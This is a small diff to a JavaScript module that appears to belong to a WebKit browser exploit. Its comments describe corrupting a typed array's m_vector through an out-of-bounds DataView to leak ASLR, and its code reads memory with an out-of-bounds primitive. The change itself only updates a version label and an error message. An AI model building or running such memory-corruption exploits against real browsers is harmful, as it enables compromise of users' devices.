@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v119 - R61 Final com Ajuste de Leitura de M_VECTOR e Robustez Máxima)
+// js/script3/testArrayBufferVictimCrash.mjs (v120 - R62 Final com Ajuste de Mensagem de Erro)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - **NOVA ABORDAGEM: Utiliza OOB DataView para CORROMPER o m_vector de um Float64Array
@@ -29,7 +29,7 @@ import {
 
 import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v119_R61_ASLR_LEAK_VECTOR_CORRUPTION"; // Renamed for new strategy
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v120_R62_ASLR_LEAK_VECTOR_CORRUPTION"; // Renamed for new strategy
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -151,7 +151,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         }
         original_oob_dataview_m_vector_for_restore = await oob_read_absolute(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER, 8);
         if (!isAdvancedInt64Object(original_oob_dataview_m_vector_for_restore) || original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.Zero) || original_oob_dataview_m_vector_for_restore.equals(AdvancedInt64.NaNValue)) {
-            const errorMsg = `Falha crítica ao ler o m_vector original do oob_dataview em ${toHex(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER)}. Valor lido: ${original_oob_dataview_m_vector_for_restore ? original_oob_dataview_m_vector_for_restore.toString(true) : 'N/A'}. Isso pode indicar corrupção, layout de memória diferente, ou que o valor é zero/NaN inesperadamente.`;
+            const errorMsg = `Falha crítica ao ler o m_vector original do oob_dataview em ${toHex(OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER)}. Valor lido: ${original_oob_dataview_m_vector_for_restore ? original_oob_dataview_m_vector_for_restore.toString(true) : 'N/A'}. Esperado um ponteiro não-nulo.`;
             logFn(errorMsg, "critical");
             throw new Error(errorMsg);
         }
